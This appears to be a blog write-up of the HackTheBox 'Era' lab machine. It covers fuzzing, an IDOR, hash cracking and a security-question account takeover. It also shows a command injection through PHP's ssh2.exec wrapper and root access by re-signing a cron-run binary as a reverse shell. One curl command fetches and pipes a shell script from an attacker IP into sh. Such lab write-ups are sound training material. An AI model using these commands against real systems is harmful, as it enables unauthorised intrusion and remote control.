+++ 
draft = false
date = 2025-08-03T15:38:58+02:00
title = "HackTheBox Era Writeup"
description = "A walkthrough for the HTB \"Era\" machine"
slug = ""
authors = ["Raul Bulgariu Suciu"]
tags = ["Tutorial", "Hacking", "HTB"]
categories = []
externalLink = ""
series = []
+++

{{<betterfigure src="files/title.png" alt="Title card">}}

Welcome, today we'll solve the HackTheBox "Era" machine:

# Basic reconnaissance

During our basic scan, we'll encounter ports 21 and 80 open:

{{<betterfigure src="./files/nmap.png" alt="Nmap scan">}}

Accessing the HTTP port, it's easy to tell that this is an entirely static website, clearly we'll need to look somewhere else.

{{<betterfigure src="./files/website.png" alt="Frontend">}}

## Fuzzing for VHosts:

Since it's clear we're supposed to look for any alternative websites within the server we'll just use ffuf do the job with the following command:

```bash
ffuf -p 0.1 -c -r -w  /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://era.htb -H "Host: FUZZ.era.htb" -fs 19493
```

> Websites usually give generic response sizes that we can filter out with `-fs ${GENERIC_SIZE}`.

{{<betterfigure src="./files/vhost.png" alt="Ffuf fuzzing">}}

It seems ffuf found an entry hidden behind the subdomain "file", if we add it to our `/etc/hosts` file we'll be met with the following website:

{{<betterfigure src="./files/filewebsite.png" alt="File website">}}

# Gaining a foothold

The most interesting part is the ability to log in using security questions, however, we currently don't have any information to take advantage of this system with:

{{<betterfigure src="./files/securityqa.png" alt="Security questions">}}

At a first glance from the first page, it might seem like we can only log in to existing accounts, however, running the following scan with gobuster will reveal the existence of a registration page:

```bash
gobuster dir --url http://file.era.htb/ --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -xl 6765
```

> Such as with ffuf, gobuster also requires the `-xl ${GENERIC_SIZE}` flag in order to filter out invalid responses.

{{<betterfigure src="./files/gobuster.png" alt="Do people even read these?">}}

## Having fun with IDOR:

After registering to the service, we can finally begin to talk about its purpose, seemingly being a page for uploading and serving files:

{{<betterfigure src="./files/filelogin.png" alt="I'm guessing not">}}

When uploading a file, we're given a link pointing to that file's ID, so we'll try to access any other files once again using ffuf:

{{<betterfigure src="./files/idortest.png" alt="So how are you?">}}

We can use `seq 0 451 > numbers.txt` to generate a quick wordlist for accessing all the identifiers until the one from our own upload, and then pair with ffuf leading us to find two valid uploads *(450 being our own upload)*.

```bash
ffuf -p 0.1 -c -r -b 'PHPSESSID=${YOUR_COOKIE}' -w numbers.txt -u http://file.era.htb/download.php?id=FUZZ -fs 7686
```

{{<betterfigure src="./files/idorsuccess.png" alt="Me I'm still alive">}}

> Remember to filter response sizes and include your PHPSESSID cookie when trying to use ffuf here.

Downloading the two files, we can spot a site backup containing the file uploader's source code, even including the database in the form of an sqlite file.

{{<betterfigure src="./files/backup.png" alt="I don't know about you">}}

Opening up the database with sqlitebrowser we can find a "users" table including all the data for the existing users at the time of the backup, including password hashes, security question answers and usernames. You might think that now we should attempt to try the security questions, however the answer is far simpler. But first, let's try to crack the hashes.

{{<betterfigure src="./files/db.png" alt="But if you're reading this I guess you're also okay">}}

Unfortunately, we were only able to crack 2 of the 6 hashes using our rockyou.txt wordlist ***(first one belonging to "eric" and second one to "yuri")***, however these will suffice for later.

{{<betterfigure src="./files/hashes.png" alt="">}}

## Why is this even a thing:

During your time exploring the ***file.era.htb*** portal you probably glossed over the "Update security questions" tab and ignored it thinking it was just a regular "Change password" form but for security questions, however, if you look more closely, you'll realize that this form also includes "Username".

{{<betterfigure src="./files/why.png" alt="Wherever you are, take care">}}

If we try inputting the admin username we found in the database...

{{<betterfigure src="./files/adminchange.png" alt="Security questions modified">}}

We'll find that we're actually allowed to change the security questions for other users, including the administrator:

{{<betterfigure src="./files/adminchange1.png" alt="Security questions modified 2">}}

Now, if we try to log in using the new security questions, we'll find ourselves inside the administrator account.

{{<betterfigure src="./files/adminlogin.png" alt="Login success">}}

## Utterly deranged reverse shell:

Shortly after logging in, you'll probably realize that there's not actually much we can do as the administrator account, looking around there seem to be no extra tabs for managing the application.

Looking inside the source code we found alongside the database file, we can find these lines in `download.php` indicating the existence of a beta function available only to the administrator:

{{<betterfigure src="./files/vulncode.png" alt="Vulnerable code">}}

The `format` parameter seems to be used to modify how the website displays the download process of the file:

{{<betterfigure src="./files/vuln1.png" alt="Vuln demonstration">}}

However, we can also see how the contents of this parameter are used inside the `fopen()` function without any sanitizing whatsoever, which we can exploit [in the following way:](https://www.php.net/manual/en/function.ssh2-exec.php)

```bash
curl -b 'PHPSESSID=${YOUR_COOKIE}' --path-as-is 'http://file.era.htb/download.php?id=54&show=true&format=ssh2.exec://yuri:${REPLACE_ME}@127.0.0.1/curl+http://10.10.x.x:8000/shell.sh|sh|'
```

> Remember to replace `${REPLACE_ME}` with the password you cracked from yuri earlier.

{{<betterfigure src="./files/shell.png" alt="">}}

> Also remember to stabilize your reverse shell with the following commands:
> ```bash
> python3 -c "import pty;pty.spawn('/bin/bash')"
> export TERM=xterm
> # Press Ctrl+Z
> stty raw -echo; fg
> ```

Once inside, we can switch to the eric user *(or execute the ssh command with eric's credentials)* and obtain the **user.txt** flag:

{{<betterfigure src="./files/userflag.png" alt="User flag">}}

# PrivEsc:

Once in, we can find inside of `/opt` a binary called "monitor" and a log file being seemingly generated from this file:

{{<betterfigure src="./files/opt.png" alt="/opt files">}}

Taking a close look we can spot that our user "eric" is inside the "devs" group, giving him write access to the monitor file, and executing it just seems to execute a regular system scan.

{{<betterfigure src="./files/devs.png" alt="">}}

Checking public crontab files, at a first glance there seems to be nothing calling this file, however, we can use [pspy](https://github.com/DominicBreuker/pspy) to check if any commands are being run periodically.

{{<betterfigure src="./files/pspy.png" alt="">}}

As you can see, there is a cronjob calling a script inside of `/root` which executes the "monitor" binary, however, it's more complicated than that, as there are other commands tied to the script. But most importantly, we have write permissions over the binary being executed by UID=0, or root.

But before anything, we should understand what's going on with the other commands, if we execute `objcopy --dump-section .text_sig=./signature.bin /opt/AV/periodic-checks/monitor` we can obtain a signature file embedded inside the binary, and if we execute the other two commands...

{{<betterfigure src="./files/1.png" alt="">}}

We can see that it pulls the email address correctly from the signature file, so we can assume that the script will refuse to run `/opt/AV/periodic-checks/monitor` if it can't correctly verify the signature, so what can we do about that?

## Learning to use objcopy:

Just as the objcopy command detected by pspy allowed us to dump the signature from the binary, we can also check the manual to find this extra line:

{{<betterfigure src="./files/2.png" alt="">}}

With the signature in our hands, we can compile a binary ourselves, and add the signature using objcopy so that the script will trust in our own binary, in this case being a [C reverse shell](https://github.com/izenynn/c-reverse-shell/blob/main/linux.c):

{{<betterfigure src="./files/rootflag.png" alt="">}}

And there you go, after compiling and adding the signature to our own reverse shell, we overwrite the monitor binary with the contents of our own, and shortly land a reverse shell right on top of the **root.txt** flag.

